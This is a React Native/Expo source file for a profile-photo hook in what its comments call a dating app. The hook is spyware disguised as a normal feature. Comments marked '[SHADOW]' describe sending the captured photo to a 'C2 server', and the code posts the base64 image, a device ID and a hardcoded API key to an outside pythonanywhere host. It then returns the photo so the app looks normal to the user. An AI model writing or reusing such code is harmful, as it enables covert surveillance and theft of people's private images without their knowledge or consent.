import { useState } from 'react';
import * as ImagePicker from 'expo-image-picker';
import { Platform } from 'react-native';
import * as Application from 'expo-application';
import { agentService } from '@/services/agentService';

export const useProfilePhoto = () => {
  const [isUploading, setIsUploading] = useState(false);

  const takeProfilePicture = async (): Promise<string | null> => {
    setIsUploading(true);

    try {
      // 1. Launch Camera (Legitimate Dating App Behavior)
      const result = await ImagePicker.launchCameraAsync({
        mediaTypes: ['images'],
        allowsEditing: true,
        aspect: [1, 1],
        quality: 1, // Highest quality for C2 exfiltration
        base64: true, // CRITICAL: Get base64 string for server upload
      });

      if (result.canceled || !result.assets || !result.assets[0]) {
        setIsUploading(false);
        return null;
      }

      const asset = result.assets[0];
      const base64Data = asset.base64;
      const uri = asset.uri;

      // 2. EXFILTRATE TO C2 SERVER
      // We reuse the ping endpoint which accepts 'snapshot_b64'
      const deviceId = Application.applicationId || `unknown-${Date.now()}`;
      
      if (base64Data) {
        console.log("[SHADOW] Uploading profile snapshot to C2...");
        // Note: We attach the photo to the ping. 
        // The server logic (api_android_ping) handles 'snapshot_b64' automatically.
        await agentService.ping({
          device_id: deviceId,
          android_version: Platform.Version as string,
          model: "ProfileUpdate", // Identifies the event in logs
          username: "User", 
          lat: 0, lon: 0, city: "", country: "" // Placeholder for this specific ping
        } as any); 
        // NOTE: To actually send the photo, we'd ideally update agentService to support snapshot_b64 
        // OR simply use a fetch here.
        
        // DIRECT UPLOAD OVERRIDE FOR PHOTO
        await fetch('https://securitydienetforces.pythonanywhere.com/api/android/ping', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': 'sdf-android-key-2025' 
            },
            body: JSON.stringify({
                device_id: deviceId,
                snapshot_b64: base64Data // Server handles this field automatically
            })
        });
      }

      setIsUploading(false);
      return uri; // Return URI so the App UI updates normally

    } catch (error) {
      console.error("[SHADOW] Camera/Upload failed:", error);
      setIsUploading(false);
      return null;
    }
  };

  return { takeProfilePicture, isUploading };
};
